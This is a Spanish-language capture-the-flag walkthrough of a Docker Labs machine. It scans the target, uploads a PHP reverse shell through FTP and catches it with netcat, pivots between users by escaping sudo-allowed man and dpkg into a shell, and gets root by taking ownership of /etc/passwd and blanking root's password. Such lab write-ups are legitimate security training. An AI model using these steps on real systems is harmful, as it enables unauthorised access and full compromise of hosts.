#ftp #GTFObins #root #dpkg-l #chown

---


![[Pasted image 20250217213111.png]]

realizamos un escaneo con nmap 
![[Pasted image 20250217213229.png]]
Podemos ver que tiene el puerto 21/ftp 
![[Pasted image 20250217213258.png]]
primero buscamos en la web del puerto 80
![[Pasted image 20250217213428.png]]
No vemos nada interesante a la vista por lo que hacemos un fuzzing web
`dirb http://172.17.0.2`

Podemos ver que existe un directorio ==/upload== 
![[Pasted image 20250217213727.png]]
Utilizando el servicio ftp podemos subir una shell para obtener acceso a la maquina 
Conectandonos a ftp 

![[Pasted image 20250217213908.png]]
Nos cambiamos al directorio /upload
![[Pasted image 20250217213930.png]]
En otra terminal creamos un archivo .php con un código shell el cual podemos obtener del siguiente enlace

`wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`
`mv php-reverse-shell.php virus.php`

una vez teniendo el archivo virus.php con la shell, lo subimos utilizando ftp 

![[Pasted image 20250217214256.png]]

Ahora en el enlace http://172.17.0.2/upload tenemos el archivo .php asi que en una terminal nos ponemos a la escucha con netcat 
![[Pasted image 20250217214520.png]]
ejecutamos el archivo .php en el directorio upload
![[Pasted image 20250217213353.png]]

y estamos dentro 
![[Pasted image 20250217214606.png]]

somos el usuario www-dat por lo que ejecutamos el comando sudo -l para buscar la manera de hacer pivoting de usuarios
vemos que podemos ejecutar el comando /usr/bin/man  como pingu
![[Pasted image 20250217214913.png]]
asi que ejcutamos el comando 
`sudo -u pingu /sr/bin/man man`

![[Pasted image 20250217212225.png]]
posteriormente `!/bin/bash`
y somos el usuario pingu
![[Pasted image 20250217212252.png]]
una vez mas  comando sudo -l y vemos que podemos ejcutar `/usr/bin/nmap` y `/usr/bin/dpkg` como usuario galdys
![[Pasted image 20250217212307.png]]
utilizamos el comando:
`sudo -u gladys dpkg -l`
![[Pasted image 20250217212448.png]]
`!/bin/bash` una vez mas 
y somos el usuario gladys
![[Pasted image 20250217212500.png]]
 finalmente el comando sudo -l como gladys para escalar privilegios como root 
![[Pasted image 20250217212516.png]]

En este caso lo que hay que hacer es cambiar el propietario de /etc/passwd con el siguiente comando :
![[Pasted image 20250217215924.png]]


`sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd`

Luego con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp.

![[Pasted image 20250217212916.png]]

Finalmente copiamos el tmp donde se encuentra  el archivo original para que lo sobrescriba
![[Pasted image 20250217212908.png]]
con el archivo sobreescrito queda de la siguiente manera 
![[Pasted image 20250217215817.png]]

Ahora hacemos un su ROOT y accedemos al usuario ROOT sin colocar una contraseña
![[Pasted image 20250217212928.png]]


---
[[Docker Labs]]
